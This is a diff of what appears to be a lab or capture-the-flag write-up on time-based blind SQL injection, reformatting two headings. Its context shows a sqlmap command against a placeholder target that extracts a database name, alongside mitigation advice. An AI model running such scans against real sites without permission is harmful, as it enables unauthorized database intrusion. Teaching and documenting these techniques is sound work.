@@ -26,7 +26,7 @@ sqlmap -u "https://target/" --forms --crawl=2 \
   --technique=T --time-sec=5 --batch --dbs
 Result: Extracted database name: utopia
 
-🛡️ Mitigation Strategies
+## 🛡️ Mitigation Strategies
 Query Parameterization: Use prepared statements exclusively
 
 Input Sanitization: Strict type and format validation
@@ -35,7 +35,7 @@ Rate Limiting: Implement request throttling to hinder timing attacks
 
 Timeout Configuration: Set low database query timeouts
 
-📊 Skills Demonstrated
+## 📊 Skills Demonstrated
 Timing Analysis: Exploiting response time differences for data extraction
 
 Patience in Exploitation: Working with slow, deliberate attack techniques
